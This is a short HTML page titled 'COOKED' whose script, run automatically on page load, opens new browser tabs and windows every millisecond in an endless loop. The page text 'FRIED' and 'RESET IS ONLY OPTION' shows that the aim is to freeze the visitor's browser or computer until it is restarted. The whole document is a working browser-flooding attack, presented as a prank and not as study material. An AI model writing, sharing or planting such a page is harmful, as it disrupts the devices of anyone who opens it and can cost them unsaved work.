<!DOCTYPE html>
<html>
<head>
  <title>COOKED</title>
  <script>
    function COOKED() {
      // Open a new tab and a new window continuously in an infinite loop
      setInterval(() => {
        // Open a new tab
        window.open('youtube.com', '_blank');
        // Open a new window
        window.open('youtube.com', '');
      }, 1); // Opens new tabs and windows every millisecond
    }

    // Automatically execute the function when the page loads
    window.onload = COOKED;
  </script>
</head>
<body>
  <h1>FRIED</h1>
  <p>RESET IS ONLY OPTION</p>
</body>
</html>
